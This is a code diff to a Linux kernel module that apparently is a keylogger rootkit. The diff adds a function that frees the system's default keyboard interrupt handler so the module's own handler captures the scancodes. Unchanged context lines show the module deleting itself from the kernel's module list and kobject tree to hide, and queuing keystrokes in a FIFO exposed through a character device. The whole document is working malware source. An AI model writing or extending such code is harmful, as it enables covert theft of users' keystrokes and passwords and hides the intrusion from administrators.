@@ -2,6 +2,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/interrupt.h>
+#include <linux/irq.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
@@ -26,7 +27,8 @@ static ssize_t device_write(struct file*, const char*, size_t, loff_t*);
 static int register_char_device(const char*, struct file_operations *);
 static void unregister_char_device(int, const char *);
 
-// IRQ related functions 
+// IRQ related functions
+static void free_default_kbd_irq(void); 
 static irqreturn_t intr_handler(int, void *);
 static int register_keyboard_irq(const char *, void *);
 static void unregister_keyboard_irq(void *);
@@ -89,6 +91,18 @@ static void unregister_char_device(int major_number, const char* device_name)
 	unregister_chrdev(major_number, device_name);
 }
 
+static void free_default_kbd_irq()
+{
+	/* Acquire the defualt handler's dev_id */
+	struct irq_desc *kbd_irq = irq_to_desc(KEYBOARD_IRQN);
+	struct irqaction *kbd_action, **kbd_action_ptr;
+
+	kbd_action_ptr = &kbd_irq->action;
+	kbd_action = *kbd_action_ptr;
+
+	free_irq(KEYBOARD_IRQN, kbd_action->dev_id);
+}
+
 static irqreturn_t intr_handler(int irq, void *dev) 
 {
 	static unsigned char scancode = 0;
@@ -138,7 +152,7 @@ static int __init mod_init(void)
 {
 	printk(KERN_INFO "initializing module\n");
 
-	printk(KERN_INFO "Hiding the module from the modules list.\n");
+	printk(KERN_INFO "hiding the module from the modules list.\n");
 	list_del_init(&__this_module.list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 
@@ -147,6 +161,9 @@ static int __init mod_init(void)
 		printk(KERN_ERR "failed to initialize keys fifo.\n");
 		return -EINVAL;
 	}
+
+	printk(KERN_INFO "freeing default kbd irq\n");
+	free_default_kbd_irq();
 
 	// Use the keys FIFO as the unique cookie of the irq
 	printk(KERN_INFO "registering keyboard irq..\n");
